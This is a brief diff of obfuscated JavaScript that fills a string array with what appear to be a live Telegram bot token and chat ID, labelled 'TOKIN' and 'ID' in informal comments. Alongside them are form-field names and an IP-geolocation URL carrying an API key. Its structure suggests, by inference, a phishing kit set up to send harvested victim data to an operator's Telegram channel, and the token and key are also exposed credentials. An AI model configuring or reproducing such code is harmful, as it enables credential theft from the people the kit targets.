@@ -75,9 +75,9 @@ function _0x2f82() {
     "errorMsg",
     "phoneCountryCode",
 	// TOKIN TA3K
-    "873287328:kjdse_izeiusjdskjdskjdsiuesius",
+    "6568108974:AAGWziprOTzhqSZDFXao6GIotPBj-uMNEAE",
 	// ID TA3K
-    "83287328732",
+    "5732203624",
     "https://api.geoapify.com/v1/ipinfo?&apiKey=a79c11b8b910493f9963963745518b72",
   ];
   _0x2f82 = function () {
